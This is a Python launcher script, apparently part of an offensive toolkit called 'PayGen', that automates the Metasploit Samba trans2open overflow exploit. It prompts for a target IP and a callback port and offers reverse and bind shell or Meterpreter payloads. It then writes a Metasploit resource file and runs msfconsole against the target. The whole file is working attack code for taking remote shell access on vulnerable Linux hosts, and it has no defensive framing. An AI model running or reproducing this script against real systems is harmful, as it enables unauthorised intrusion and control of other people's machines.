#!/usr/bin/python

# Launch Samba trans2open Exploit
# J.Markwart - M.Jones - PayGen

## Comments ##
# Simple Samba trans2open Overflow (Linux x86) Exploit

import os
import subprocess
from src import menus
from src.main import *
from time import sleep

path = msfpath()

while 1:
	try:

		# select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.samba_title()
			target = raw_input("Enter target IP: ")
			port = raw_input("Enter port for reverse connection: ")
			sleep(1)
			menus.samba_menu()
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "linux/x86/shell/reverse_tcp"
				break
			if selection == '2':
				payload = "linux/x86/shell/bind_tcp"
				break
			if selection == '3':
				payload = "linux/x86/meterpreter/reverse_tcp"
				break
			if selection == '4':
				payload = "linux/x86/meterpreter/bind_tcp"
				break

		# create rc file
		rcfile = "/tmp/samba_payload.rc"
		fw = open(rcfile, "w")
		fw.write("use exploit/linux/samba/trans2open\n")
		fw.write("set RHOST %s\n" % target)
		fw.write("set PAYLOAD %s\n" % payload)
		fw.write("set LHOST 0.0.0.0\n") 
		fw.write("set LPORT %s\n" % port)

		fw.write("exploit")
		fw.close()

		# exploit the target
		PrintInfo("Exploiting the target linux machine. Please wait...")
		subprocess.Popen("%s/msfconsole -r %s" % (path, rcfile), shell=True).wait()

		# clean up
		PrintInfo("Cleaning up...")
		os.remove(rcfile)
		sleep(1)
		# back to main
		break
	except KeyboardInterrupt:
		break
